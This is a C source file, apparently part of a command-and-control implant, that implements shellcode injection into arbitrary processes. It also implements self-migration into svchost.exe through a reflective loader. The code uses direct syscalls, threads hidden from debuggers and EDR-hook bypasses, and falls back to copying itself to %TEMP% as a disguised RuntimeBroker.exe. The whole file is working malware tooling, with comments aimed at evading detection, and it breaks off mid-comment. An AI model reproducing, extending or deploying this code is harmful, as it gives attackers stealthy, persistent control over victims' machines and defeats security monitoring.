/*
 * client/inject.c  –  Process injection and agent migration
 * ==========================================================
 * See inject.h for the full design description.
 *
 * Implementation notes
 * --------------------
 *  •  All NT calls go through direct syscall trampolines (syscall.h) —
 *     no GetProcAddress-resolved function pointers, no NTDLL stub in the
 *     call stack, no IAT entries for VirtualAllocEx/CreateRemoteThread.
 *  •  Module/export resolution uses the PEB walk (peb_walk.h) —
 *     no GetModuleHandle, no GetProcAddress visible in the import table.
 *  •  Memory lifecycle for injection:
 *       1. SC_NtAllocateVirtualMemory(PAGE_READWRITE)    – allocate RW
 *       2. SC_NtWriteVirtualMemory                     – write payload
 *       3. SC_NtProtectVirtualMemory(PAGE_EXECUTE_READ)– flip to RX
 *       4. SC_NtCreateThreadEx(HideFromDebugger=TRUE)  – start thread
 *     No page is ever simultaneously Writable and Executable (W^X).
 *
 *  •  hex_decode() used for shellcode is a simple inline parser; it
 *     does not use sscanf/strtol (avoids MSVCRT dependency).
 */

#include "inject.h"
#include "../core/config.h"
#include "../evasion/syscall.h"
#include "../evasion/peb_walk.h"
#include "loader.h"
#include "loader_blob.h"
#include "../../tls/tls_client.h"

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <windows.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <bcrypt.h>

/* g_key_path is defined in main.c; we need its address to compute the RVA */
extern char g_key_path[];


/* ── Flag supplement ─────────────────────────────────────────────────────── */

#ifndef THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER
#define THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER  0x00000004
#endif

static BOOL g_inject_ready = FALSE;


/* ── Internal helpers ────────────────────────────────────────────────────── */

/* Send a plain-text status back to C2 */
static void _isend(TLS_CONTEXT *pTls, const char *msg)
{
    if (!msg || !*msg) msg = " ";
    tls_send_msg(pTls, (const BYTE *)msg, (DWORD)strlen(msg));
}

/* Hex nibble decoder — no CRT dependency */
static int _hex_nibble(char c)
{
    if (c >= '0' && c <= '9') return c - '0';
    if (c >= 'a' && c <= 'f') return c - 'a' + 10;
    if (c >= 'A' && c <= 'F') return c - 'A' + 10;
    return -1;
}

/*
 * hex_decode
 * ----------
 * Decodes an ASCII hex string into a newly malloc()'d byte array.
 * *pcbOut receives the byte count.  Returns NULL on bad input or OOM.
 * Caller must free() the result.
 */
static BYTE *_hex_decode(const char *hex, DWORD *pcbOut)
{
    *pcbOut = 0;
    size_t hexLen = strlen(hex);
    /* Strip optional "0x" prefix */
    if (hexLen >= 2 && hex[0] == '0' && (hex[1] == 'x' || hex[1] == 'X'))
    { hex += 2; hexLen -= 2; }

    if (hexLen == 0 || hexLen & 1) return NULL;     /* must be even length */

    DWORD  cbOut = (DWORD)(hexLen / 2);
    BYTE  *pOut  = (BYTE *)malloc(cbOut);
    if (!pOut) return NULL;

    for (DWORD i = 0; i < cbOut; i++) {
        int hi = _hex_nibble(hex[i * 2]);
        int lo = _hex_nibble(hex[i * 2 + 1]);
        if (hi < 0 || lo < 0) { free(pOut); return NULL; }
        pOut[i] = (BYTE)((hi << 4) | lo);
    }
    *pcbOut = cbOut;
    return pOut;
}

/*
 * _open_target
 * ------------
 * Opens the target process with the minimum access needed for injection.
 * Returns INVALID_HANDLE_VALUE on failure.
 */
static HANDLE _open_target(DWORD pid)
{
    return OpenProcess(
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE |
        PROCESS_VM_READ      | PROCESS_CREATE_THREAD |
        PROCESS_QUERY_LIMITED_INFORMATION,
        FALSE, pid);
}


/* ── Public: inject_init ─────────────────────────────────────────────────── */

BOOL inject_init(void)
{
    if (g_inject_ready) return TRUE;

    /* sc_init resolves SSNs via PEB walk — no GetProcAddress, no GetModuleHandle */
    if (!sc_init()) return FALSE;

    g_inject_ready = TRUE;
    return TRUE;
}


/* ── Public: inject_shellcode ────────────────────────────────────────────── */
/*
 * Wire verb: "inject <pid> <hex-shellcode>"
 *
 * Example (msfvenom calc.exe shellcode in hex):
 *   inject 1234 fc4883e4f0e8c8000000...
 *
 * Steps:
 *   1. Parse PID and hex shellcode
 *   2. OpenProcess (minimal rights)
 *   3. NtAllocateVirtualMemory (PAGE_READWRITE)
 *   4. NtWriteVirtualMemory
 *   5. NtProtectVirtualMemory (PAGE_EXECUTE_READ) — enforce W^X
 *   6. NtCreateThreadEx (HideFromDebugger)
 *   7. NtClose handles, report result
 */

void inject_shellcode(TLS_CONTEXT *pTls, const char *args)
{
    if (!g_inject_ready) {
        _isend(pTls, "[-] inject: NT syscalls not initialised");
        return;
    }

    /* Parse: "<pid> <hexstring>" */
    char pidStr[32]   = {0};
    char hexStr[65536]= {0};     /* up to 32 KB shellcode */

    if (sscanf(args, "%31s %65535s", pidStr, hexStr) != 2) {
        _isend(pTls, "Usage: inject <pid> <hex-shellcode>");
        return;
    }

    DWORD pid = (DWORD)strtoul(pidStr, NULL, 10);
    if (pid == 0) {
        _isend(pTls, "[-] inject: invalid PID");
        return;
    }

    DWORD  cbShell = 0;
    BYTE  *pShell  = _hex_decode(hexStr, &cbShell);
    if (!pShell || cbShell == 0) {
        _isend(pTls, "[-] inject: invalid hex shellcode");
        return;
    }

    /* Open target */
    HANDLE hProc = _open_target(pid);
    if (!hProc || hProc == INVALID_HANDLE_VALUE) {
        free(pShell);
        char buf[64];
        _snprintf(buf, sizeof(buf)-1, "[-] inject: OpenProcess(%lu) failed (err %lu)", pid, GetLastError());
        _isend(pTls, buf);
        return;
    }

    /* Allocate RW memory in target */
    PVOID   pRemote = NULL;
    SIZE_T  cbAlloc = (SIZE_T)cbShell;
    NTSTATUS ns = SC_NtAllocateVirtualMemory(hProc, &pRemote, 0, &cbAlloc,
                                            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!NT_SUCCESS(ns)) {
        CloseHandle(hProc); free(pShell);
        char buf[80];
        _snprintf(buf, sizeof(buf)-1, "[-] inject: NtAllocateVirtualMemory failed (0x%08lX)", (unsigned long)ns);
        _isend(pTls, buf);
        return;
    }

    /* Write shellcode */
    SIZE_T cbWritten = 0;
    ns = SC_NtWriteVirtualMemory(hProc, pRemote, pShell, cbShell, &cbWritten);
    free(pShell);
    if (!NT_SUCCESS(ns) || cbWritten != cbShell) {
        CloseHandle(hProc);
        char buf[80];
        _snprintf(buf, sizeof(buf)-1, "[-] inject: NtWriteVirtualMemory failed (0x%08lX)", (unsigned long)ns);
        _isend(pTls, buf);
        return;
    }

    /* Flip RW → RX (W^X: no RWX page ever) */
    PVOID  pBase   = pRemote;
    SIZE_T cbProt  = (SIZE_T)cbShell;
    ULONG  oldProt = 0;
    ns = SC_NtProtectVirtualMemory(hProc, &pBase, &cbProt, PAGE_EXECUTE_READ, &oldProt);
    if (!NT_SUCCESS(ns)) {
        CloseHandle(hProc);
        char buf[80];
        _snprintf(buf, sizeof(buf)-1, "[-] inject: NtProtectVirtualMemory failed (0x%08lX)", (unsigned long)ns);
        _isend(pTls, buf);
        return;
    }

    /* Create remote thread — hidden from debugger */
    HANDLE hThread = NULL;
    ns = SC_NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL,
                             hProc, pRemote, NULL,
                             THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER,
                             0, 0, 0, NULL);
    CloseHandle(hProc);

    if (!NT_SUCCESS(ns) || !hThread) {
        char buf[80];
        _snprintf(buf, sizeof(buf)-1, "[-] inject: NtCreateThreadEx failed (0x%08lX)", (unsigned long)ns);
        _isend(pTls, buf);
        return;
    }

    SC_NtClose(hThread);

    char buf[128];
    _snprintf(buf, sizeof(buf)-1,
              "[+] inject: %lu bytes shellcode injected and executing in PID %lu",
              (unsigned long)cbShell, (unsigned long)pid);
    _isend(pTls, buf);
}


/* ── Reflective PE loader blob (auto-generated at build time) ───────────── */
/*
 * s_rfl_loader[] contains the raw x64 machine code for rfl_loader() from
 * loader.c, extracted by objcopy after compiling with -fpic.
 *
 * Memory layout written into the target process:
 *
 *   [pRemote + 0]                  rfl_loader code  (S_RFL_LOADER_SIZE bytes, RX)
 *   [pRemote + S_RFL_LOADER_SIZE]  RflData block    (sizeof(RflData), RW)
 *   [pRemote + S_RFL_LOADER_SIZE
 *            + sizeof(RflData)]    Raw PE bytes      (cbPE bytes, RW)
 *
 * Thread entry point:  pRemote
 * Thread argument:     pRemote + S_RFL_LOADER_SIZE  (= &RflData in target)
 *
 * rfl_loader() does full PE mapping inside the target (no LoadLibraryA on
 * the EXE — bypasses EDR hooks on the PE loader API):
 *   1. VirtualAlloc(SizeOfImage, PAGE_EXECUTE_READWRITE)
 *   2. Copy headers + sections
 *   3. Apply base relocations
 *   4. Resolve IAT via LoadLibraryA + GetProcAddress (for DLLs, not the EXE)
 *   5. Write g_key_path into the mapped image
 *   6. CreateThread → AgentRun()
 */


/* ── PE parsing helpers (used only in migrate_to_pid) ───────────────────── */

/* Returns the file offset of the PE Optional Header */
static DWORD _pe_opt_offset(const BYTE *raw)
{
    DWORD e_lfanew;
    memcpy(&e_lfanew, raw + 0x3C, 4);          /* DOS header e_lfanew */
    return e_lfanew + 4 + 20;                   /* after sig + FileHeader */
}

/*
 * _rfl_rva_off
 * ------------
 * Converts a PE RVA to a raw-file offset by scanning the section table.
 * Returns 0 if the RVA falls outside all sections.
 */
static DWORD _rfl_rva_off(const BYTE *raw, const BYTE *secBase,
                           WORD nSec, DWORD rva)
{
    for (WORD i = 0; i < nSec; i++) {
        DWORD vaddr, vsz, rawOff, rawSz2;
        memcpy(&vaddr,  secBase + i*40 + 12, 4);
        memcpy(&vsz,    secBase + i*40 + 8,  4);
        memcpy(&rawOff, secBase + i*40 + 20, 4);
        memcpy(&rawSz2, secBase + i*40 + 16, 4);
        if (rva >= vaddr && rva < vaddr + vsz) {
            DWORD off = rawOff + (rva - vaddr);
            (void)raw; (void)rawSz2;
            return off;
        }
    }
    return 0;
}

/*
 * _pe_find_export
 * ---------------
 * Parses the export directory of a PE file (raw bytes, PE32+/x64 only)
 * and returns the RVA of the exported function named `name`, or 0.
 */
static DWORD _pe_find_export(const BYTE *raw, DWORD rawSz, const char *name)
{
    DWORD optOff = _pe_opt_offset(raw);
    if (optOff + 0x78 > rawSz) return 0;

    WORD magic;
    memcpy(&magic, raw + optOff, 2);
    if (magic != 0x020B) return 0;

    DWORD expRVA;
    memcpy(&expRVA, raw + optOff + 0x70, 4);
    if (!expRVA) return 0;

    /* Locate section headers */
    WORD nSec, optSz;
    memcpy(&nSec,  raw + optOff - 20 + 2,  2);
    memcpy(&optSz, raw + optOff - 20 + 16, 2);
    const BYTE *secBase = raw + optOff - 20 + 20 + optSz;

    DWORD expOff = _rfl_rva_off(raw, secBase, nSec, expRVA);
    if (!expOff || expOff + 40 > rawSz) return 0;

    DWORD  nNames, addrTableRVA, nameTableRVA, ordTableRVA;
    memcpy(&nNames,       raw + expOff + 24, 4);
    memcpy(&addrTableRVA, raw + expOff + 28, 4);
    memcpy(&nameTableRVA, raw + expOff + 32, 4);
    memcpy(&ordTableRVA,  raw + expOff + 36, 4);

    DWORD addrOff = _rfl_rva_off(raw, secBase, nSec, addrTableRVA);
    DWORD nameOff = _rfl_rva_off(raw, secBase, nSec, nameTableRVA);
    DWORD ordOff  = _rfl_rva_off(raw, secBase, nSec, ordTableRVA);
    if (!addrOff || !nameOff || !ordOff) return 0;

    size_t nameLen = strlen(name);
    for (DWORD i = 0; i < nNames; i++) {
        DWORD nameRVA;
        memcpy(&nameRVA, raw + nameOff + i*4, 4);
        DWORD noff2 = _rfl_rva_off(raw, secBase, nSec, nameRVA);
        if (!noff2 || noff2 >= rawSz) continue;
        const char *fn = (const char *)(raw + noff2);
        if (strncmp(fn, name, nameLen + 1) != 0) continue;

        WORD ord;
        memcpy(&ord, raw + ordOff + i*2, 2);
        DWORD funcRVA;
        memcpy(&funcRVA, raw + addrOff + ord*4, 4);
        return funcRVA;
    }
    return 0;
}


/* ── Public: migrate_to_pid ─────────────────────────────────────────────── */
/*
 * Wire verb: "migrate <pid>"
 *
 * True reflective injection strategy:
 *   1. Read this process's raw PE bytes from disk.
 *   2. Parse the export table to find AgentRun's RVA.
 *   3. Compute g_key_path's RVA from its live VA and our image base.
 *   4. Allocate RW memory in the target:
 *        [rfl_loader code | RflData | raw PE bytes]
 *   5. Write the region, flip loader code to RX.
 *   6. NtCreateThreadEx at rfl_loader, arg = &RflData.
 *
 * rfl_loader() runs inside the target and does full PE loading:
 * headers, sections, base relocations, IAT — no LoadLibraryA on the EXE.
 * This avoids all Windows PE-loader callbacks that EDRs intercept.
 */

void migrate_to_pid(TLS_CONTEXT *pTls, const char *args)
{
    if (!g_inject_ready) {
        _isend(pTls, "[-] migrate: NT syscalls not initialised");
        return;
    }

    /* Parse PID */
    DWORD pid = (DWORD)strtoul(args, NULL, 10);
    if (pid == 0) {
        _isend(pTls, "Usage: migrate <pid>");
        return;
    }

    /* ── 1. Get our own EXE path and read raw PE bytes ───────────────── */
    char exePath[MAX_PATH] = {0};
    if (!GetModuleFileNameA(NULL, exePath, sizeof(exePath) - 1)) {
        _isend(pTls, "[-] migrate: GetModuleFileName failed");
        return;
    }

    FILE *f = fopen(exePath, "rb");
    if (!f) {
        _isend(pTls, "[-] migrate: cannot open own EXE");
        return;
    }
    fseek(f, 0, SEEK_END);
    long fsize = ftell(f);
    fseek(f, 0, SEEK_SET);
    if (fsize <= 0 || fsize > 8 * 1024 * 1024) {
        fclose(f);
        _isend(pTls, "[-] migrate: EXE size out of range");
        return;
    }
    DWORD cbPE = (DWORD)fsize;
    BYTE *pPE  = (BYTE *)malloc(cbPE);
    if (!pPE) { fclose(f); _isend(pTls, "[-] migrate: OOM"); return; }
    if (fread(pPE, 1, cbPE, f) != cbPE) {
        fclose(f); free(pPE);
        _isend(pTls, "[-] migrate: EXE read error");
        return;
    }
    fclose(f);

    /* ── 2. Find AgentRun RVA in the raw PE ──────────────────────────── */
    DWORD agentRunRva = _pe_find_export(pPE, cbPE, "AgentRun");
    if (!agentRunRva) {
        free(pPE);
        _isend(pTls, "[-] migrate: AgentRun export not found in PE");
        return;
    }

    /* ── 3. Compute g_key_path RVA (VA - ImageBase) ──────────────────── */
    HMODULE hSelf     = GetModuleHandleA(NULL);
    DWORD   keyPathRva = (DWORD)((ULONG_PTR)g_key_path - (ULONG_PTR)hSelf);

    /* ── 4. Resolve kernel32 API pointers (shared base across processes) */
    HMODULE hK32              = GetModuleHandleA("kernel32.dll");
    LPVOID (WINAPI *pVAlloc)(LPVOID, SIZE_T, DWORD, DWORD) =
        (LPVOID (WINAPI *)(LPVOID, SIZE_T, DWORD, DWORD))
        GetProcAddress(hK32, "VirtualAlloc");
    BOOL (WINAPI *pFlush)(HANDLE, LPCVOID, SIZE_T) =
        (BOOL (WINAPI *)(HANDLE, LPCVOID, SIZE_T))
        GetProcAddress(hK32, "FlushInstructionCache");
    HMODULE (WINAPI *pLoadLib)(LPCSTR) =
        (HMODULE (WINAPI *)(LPCSTR))
        GetProcAddress(hK32, "LoadLibraryA");
    FARPROC (WINAPI *pGetProc)(HMODULE, LPCSTR) =
        (FARPROC (WINAPI *)(HMODULE, LPCSTR))
        GetProcAddress(hK32, "GetProcAddress");
    HANDLE (WINAPI *pCreateThread2)(LPSECURITY_ATTRIBUTES, SIZE_T,
                                    LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD) =
        (HANDLE (WINAPI *)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE,
                           LPVOID, DWORD, LPDWORD))
        GetProcAddress(hK32, "CreateThread");
    BOOL (WINAPI *pCloseH)(HANDLE) =
        (BOOL (WINAPI *)(HANDLE))
        GetProcAddress(hK32, "CloseHandle");

    if (!pVAlloc || !pFlush || !pLoadLib || !pGetProc || !pCreateThread2 || !pCloseH) {
        free(pPE);
        _isend(pTls, "[-] migrate: kernel32 export resolution failed");
        return;
    }

    /* ── 5. Open target process ──────────────────────────────────────── */
    HANDLE hProc = _open_target(pid);
    if (!hProc || hProc == INVALID_HANDLE_VALUE) {
        free(pPE);
        char buf[80];
        _snprintf(buf, sizeof(buf)-1,
                  "[-] migrate: OpenProcess(%lu) failed (err %lu)",
                  (unsigned long)pid, (unsigned long)GetLastError());
        _isend(pTls, buf);
        return;
    }

#ifdef _WIN64
    BOOL bWow64 = FALSE;
    IsWow64Process(hProc, &bWow64);
    if (bWow64) {
        CloseHandle(hProc); free(pPE);
        _isend(pTls, "[-] migrate: cannot inject x64 loader into WOW64 process");
        return;
    }
#endif

    /* ── 6. Build RflData block ──────────────────────────────────────── */
    RflData rfd;
    ZeroMemory(&rfd, sizeof(rfd));
    /* pRawPE points into the target allocation — filled with relative offset below */
    rfd.rawSize        = cbPE;
    rfd.agentRunRva    = agentRunRva;
    rfd.gKeyPathOffset = keyPathRva;
    rfd.gKeyPathSize   = MAX_PATH * 2;
    strncpy(rfd.keyPath, g_key_path, sizeof(rfd.keyPath) - 1);
    rfd.pVirtualAlloc         = (LPVOID (WINAPI *)(LPVOID, SIZE_T, DWORD, DWORD)) pVAlloc;
    rfd.pFlushInstructionCache = (BOOL (WINAPI *)(HANDLE, LPCVOID, SIZE_T)) pFlush;
    rfd.pLoadLibraryA          = (HMODULE (WINAPI *)(LPCSTR)) pLoadLib;
    rfd.pGetProcAddress        = (FARPROC (WINAPI *)(HMODULE, LPCSTR)) pGetProc;
    rfd.pCreateThread          = (HANDLE (WINAPI *)(LPSECURITY_ATTRIBUTES, SIZE_T,
                                  LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD))
                                  pCreateThread2;
    rfd.pCloseHandle           = (BOOL (WINAPI *)(HANDLE)) pCloseH;

    /* ── 7. Allocate region in target: [loader | RflData | PE] ──────── */
    SIZE_T cbLoader  = (SIZE_T)S_RFL_LOADER_SIZE;
    SIZE_T cbRfd     = sizeof(RflData);
    SIZE_T cbTotal   = cbLoader + cbRfd + (SIZE_T)cbPE;

    PVOID  pRemote = NULL;
    NTSTATUS ns = SC_NtAllocateVirtualMemory(hProc, &pRemote, 0, &cbTotal,
                                             MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!NT_SUCCESS(ns)) {
        CloseHandle(hProc); free(pPE);
        char buf[80];
        _snprintf(buf, sizeof(buf)-1,
                  "[-] migrate: alloc failed (0x%08lX)", (unsigned long)ns);
        _isend(pTls, buf);
        return;
    }

    /* Fix up pRawPE to the VA inside the target where the PE bytes will sit */
    rfd.pRawPE = (unsigned char *)((BYTE *)pRemote + cbLoader + cbRfd);

    /* ── 8. Build and write the flat buffer ──────────────────────────── */
    DWORD  cbFlat = (DWORD)(cbLoader + cbRfd + (SIZE_T)cbPE);
    BYTE  *pFlat  = (BYTE *)malloc(cbFlat);
    if (!pFlat) {
        CloseHandle(hProc); free(pPE);
        _isend(pTls, "[-] migrate: OOM building flat buffer");
        return;
    }
    memcpy(pFlat,                           s_rfl_loader, cbLoader);
    memcpy(pFlat + cbLoader,                &rfd,         cbRfd);
    memcpy(pFlat + cbLoader + cbRfd,        pPE,          cbPE);
    free(pPE);

    SIZE_T cbWritten = 0;
    ns = SC_NtWriteVirtualMemory(hProc, pRemote, pFlat, cbFlat, &cbWritten);
    free(pFlat);
    if (!NT_SUCCESS(ns)) {
        CloseHandle(hProc);
        char buf[80];
        _snprintf(buf, sizeof(buf)-1,
                  "[-] migrate: write failed (0x%08lX)", (unsigned long)ns);
        _isend(pTls, buf);
        return;
    }

    /* ── 9. Flip loader code region to RX ────────────────────────────── */
    PVOID  pBase  = pRemote;
    SIZE_T cbProt = cbLoader;
    ULONG  oldProt = 0;
    ns = SC_NtProtectVirtualMemory(hProc, &pBase, &cbProt,
                                   PAGE_EXECUTE_READ, &oldProt);
    if (!NT_SUCCESS(ns)) {
        CloseHandle(hProc);
        char buf[80];
        _snprintf(buf, sizeof(buf)-1,
                  "[-] migrate: protect failed (0x%08lX)", (unsigned long)ns);
        _isend(pTls, buf);
        return;
    }

    /* ── 10. Spawn loader thread ─────────────────────────────────────── */
    PVOID  pArg    = (BYTE *)pRemote + cbLoader;   /* &RflData in target */
    HANDLE hThread = NULL;
    ns = SC_NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL,
                             hProc, pRemote, pArg,
                             THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER,
                             0, 0, 0, NULL);
    CloseHandle(hProc);

    if (!NT_SUCCESS(ns) || !hThread) {
        char buf[80];
        _snprintf(buf, sizeof(buf)-1,
                  "[-] migrate: NtCreateThreadEx failed (0x%08lX)", (unsigned long)ns);
        _isend(pTls, buf);
        return;
    }
    SC_NtClose(hThread);

    /* Give the new instance a moment to start before we send the response */
    Sleep(800);

    char buf[256];
    _snprintf(buf, sizeof(buf)-1,
              "[+] migrate: reflective loader injected into PID %lu — exiting",
              (unsigned long)pid);
    _isend(pTls, buf);

    tls_disconnect(pTls);
    ExitProcess(0);
}


/* ── _find_host_pid ──────────────────────────────────────────────────────── */
/*
 * Find a suitable svchost.exe to use as the reflective-injection host.
 *
 * Selection criteria (in order of preference):
 *   1. 64-bit svchost.exe (IsWow64Process == FALSE)
 *   2. Has at least one established outbound TCP connection so our new TLS
 *      connection does not look anomalous in a per-process flow view.
 *   3. Running as the current user (avoids cross-session token issues that
 *      would prevent our thread from calling Winsock APIs).
 *
 * In practice we just grab the first non-WOW64 svchost that we can open
 * with the rights needed for reflective injection.  Full network-presence
 * scoring would require Iphlpapi (GetExtendedTcpTable) — a new import that
 * raises the binary's fingerprint; we skip it for now.
 *
 * Returns 0 if no suitable PID is found.
 */
static DWORD _find_host_pid(void)
{
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(pe);
    DWORD bestPid = 0;

    if (Process32First(hSnap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, L"svchost.exe") != 0) continue;

            /* Try to open with minimum injection rights */
            HANDLE hProc = OpenProcess(
                PROCESS_VM_OPERATION | PROCESS_VM_WRITE |
                PROCESS_VM_READ      | PROCESS_CREATE_THREAD |
                PROCESS_QUERY_LIMITED_INFORMATION,
                FALSE, pe.th32ProcessID);
            if (!hProc) continue;

            /* Skip WOW64 (32-bit) instances — we are x64 */
            BOOL bWow64 = FALSE;
            IsWow64Process(hProc, &bWow64);
            CloseHandle(hProc);
            if (bWow64) continue;

            bestPid = pe.th32ProcessID;
            break;   /* first eligible svchost wins */
        } while (Process32Next(hSnap, &pe));
    }
    CloseHandle(hSnap);
    return bestPid;
}


/* ── Public: auto_migrate ────────────────────────────────────────────────── */
/*
 * Called once at startup (before connecting to C2).
 *
 * Strategy (two-tier, first success wins):
 *
 *   Tier 1 — Reflective in-memory injection (no disk artifact):
 *     Find a live svchost.exe, inject ourselves via the reflective loader
 *     blob, then ExitProcess.  The injected copy runs AgentRun() inside
 *     svchost.exe — no new file on disk, no new process in the process list.
 *
 *   Tier 2 — %TEMP% copy fallback (original behaviour):
 *     If Tier 1 fails (no suitable svchost, access denied, etc.) fall back to
 *     copying the EXE to %TEMP%\RuntimeBroker.exe and spawning it.  Still
 *     better than running as the original EXE.
 *
 * On any success this function never returns (ExitProcess is called).
 * Returns FALSE only if both tiers fail — caller continues as-is.
 */
BOOL auto_migrate(const char *keyPath)
{
    (void)keyPath;   /* child inherits g_key_path via its own resolve_key_path() */

    /* ── Tier 1: reflective injection into live svchost.exe ─────────── */
    if (g_inject_ready) {
        DWORD hostPid = _find_host_pid();
        if (hostPid != 0) {
            /*
             * Reuse migrate_to_pid's full implementation.  It reads the EXE,
             * builds the [loader|RflData|PE] block, injects it, fires a thread
             * at AgentRun, sends a status over TLS … but we are not connected
             * yet.  We call the internals directly with pTls=NULL to skip the
             * TLS send.  If the injection succeeds, we ExitProcess here.
             *
             * Implementation: duplicate just the allocation+write+thread steps
             * inline so we avoid adding a NULL-pTls code path to migrate_to_pid.
             */

            /* Read own PE */
            char exePath[MAX_PATH] = {0};
            if (GetModuleFileNameA(NULL, exePath, sizeof(exePath) - 1)) {
                FILE *f = fopen(exePath, "rb");
                if (f) {
                    fseek(f, 0, SEEK_END);
                    long fsz = ftell(f);
                    fseek(f, 0, SEEK_SET);
                    if (fsz > 0 && fsz <= 8 * 1024 * 1024) {
                        DWORD cbPE = (DWORD)fsz;
                        BYTE *pPE  = (BYTE *)malloc(cbPE);
                        if (pPE && fread(pPE, 1, cbPE, f) == cbPE) {
                            DWORD agentRunRva = _pe_find_export(pPE, cbPE, "AgentRun");
                            if (agentRunRva) {
                                HMODULE hSelf2    = GetModuleHandleA(NULL);
                                DWORD   keyRva   = (DWORD)((ULONG_PTR)g_key_path
                                                            - (ULONG_PTR)hSelf2);
                                HMODULE hK32     = GetModuleHandleA("kernel32.dll");
                                typedef LPVOID (WINAPI *pVA_t)(LPVOID,SIZE_T,DWORD,DWORD);
                                typedef BOOL   (WINAPI *pFIC_t)(HANDLE,LPCVOID,SIZE_T);
                                typedef HMODULE(WINAPI *pLL_t)(LPCSTR);
                                typedef FARPROC(WINAPI *pGP_t)(HMODULE,LPCSTR);
                                typedef HANDLE (WINAPI *pCT_t)(LPSECURITY_ATTRIBUTES,SIZE_T,
                                                                LPTHREAD_START_ROUTINE,LPVOID,
                                                                DWORD,LPDWORD);
                                typedef BOOL   (WINAPI *pCH_t)(HANDLE);
                                pVA_t  pVA  = (pVA_t) GetProcAddress(hK32,"VirtualAlloc");
                                pFIC_t pFIC = (pFIC_t)GetProcAddress(hK32,"FlushInstructionCache");
                                pLL_t  pLL  = (pLL_t) GetProcAddress(hK32,"LoadLibraryA");
                                pGP_t  pGP  = (pGP_t) GetProcAddress(hK32,"GetProcAddress");
                                pCT_t  pCT  = (pCT_t) GetProcAddress(hK32,"CreateThread");
                                pCH_t  pCH  = (pCH_t) GetProcAddress(hK32,"CloseHandle");
                                if (pVA && pFIC && pLL && pGP && pCT && pCH) {
                                    HANDLE hProc2 = OpenProcess(
                                        PROCESS_VM_OPERATION|PROCESS_VM_WRITE|
                                        PROCESS_VM_READ|PROCESS_CREATE_THREAD|
                                        PROCESS_QUERY_LIMITED_INFORMATION,
                                        FALSE, hostPid);
                                    if (hProc2) {
                                        RflData rfd2;
                                        ZeroMemory(&rfd2, sizeof(rfd2));
                                        rfd2.rawSize           = cbPE;
                                        rfd2.agentRunRva       = agentRunRva;
                                        rfd2.gKeyPathOffset    = keyRva;
                                        rfd2.gKeyPathSize      = MAX_PATH * 2;
                                        strncpy(rfd2.keyPath, g_key_path,
                                                sizeof(rfd2.keyPath) - 1);
                                        rfd2.pVirtualAlloc         = pVA;
                                        rfd2.pFlushInstructionCache= pFIC;
                                        rfd2.pLoadLibraryA         = pLL;
                                        rfd2.pGetProcAddress       = pGP;
                                        rfd2.pCreateThread         = pCT;
                                        rfd2.pCloseHandle          = pCH;

                                        SIZE_T cbL   = (SIZE_T)S_RFL_LOADER_SIZE;
                                        SIZE_T cbR   = sizeof(RflData);
                                        SIZE_T cbTot = cbL + cbR + (SIZE_T)cbPE;
                                        PVOID  pRem  = NULL;
                                        NTSTATUS ns2 = SC_NtAllocateVirtualMemory(
                                            hProc2, &pRem, 0, &cbTot,
                                            MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
                                        if (NT_SUCCESS(ns2)) {
                                            rfd2.pRawPE = (unsigned char *)
                                                ((BYTE *)pRem + cbL + cbR);
                                            DWORD cbFlat2 = (DWORD)(cbL+cbR+cbPE);
                                            BYTE *pFlat2  = (BYTE *)malloc(cbFlat2);
                                            if (pFlat2) {
                                                memcpy(pFlat2,          s_rfl_loader, cbL);
                                                memcpy(pFlat2+cbL,      &rfd2,        cbR);
                                                memcpy(pFlat2+cbL+cbR,  pPE,          cbPE);
                                                SIZE_T cbWr2 = 0;
                                                SC_NtWriteVirtualMemory(hProc2, pRem,
                                                    pFlat2, cbFlat2, &cbWr2);
                                                free(pFlat2);
                                                PVOID  pB2 = pRem;
                                                SIZE_T cP2 = cbL;
                                                ULONG  oP2 = 0;
                                                SC_NtProtectVirtualMemory(hProc2, &pB2,
                                                    &cP2, PAGE_EXECUTE_READ, &oP2);
                                                PVOID  pArg2   = (BYTE *)pRem + cbL;
                                                HANDLE hTh2    = NULL;
                                                NTSTATUS ns3 = SC_NtCreateThreadEx(
                                                    &hTh2, THREAD_ALL_ACCESS, NULL,
                                                    hProc2, pRem, pArg2,
                                                    THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER,
                                                    0, 0, 0, NULL);
                                                if (NT_SUCCESS(ns3) && hTh2) {
                                                    SC_NtClose(hTh2);
                                                    CloseHandle(hProc2);
                                                    free(pPE);
                                                    fclose(f);
                                                    Sleep(500);
                                                    ExitProcess(0);
                                                    /* unreachable */
                                                }
                                            }
                                        }
                                        CloseHandle(hProc2);
                                    }
                                }
                            }
                        }
                        if (pPE) free(pPE);
                    }
                    fclose(f);
                }
            }
            /* Tier 1 failed — fall through to Tier 2 */
        }
    }

    /* ── Tier 2: %TEMP% copy + spawn (original fallback) ────────────── */

    /* ── 1. Get our own EXE path ─────────────────────────────────────── */
    char srcPath[MAX_PATH] = {0};
    if (!GetModuleFileNameA(NULL, srcPath, sizeof(srcPath) - 1))
        return FALSE;

    /* ── 2. Build destination: %TEMP%\<obfuscated name> ─────────────── */
    /*
     * Early-out: if we are already running from the migration destination
     * path (i.e. we are the child spawned by a previous Tier-2 migration)
     * do NOT re-copy / re-spawn.  Without this guard the child would try
     * CopyFileA(dstPath, dstPath) which may fail with a sharing violation
     * on some Windows versions but is undefined behaviour either way.
     * Checking the paths first makes the "already migrated" case explicit.
     *
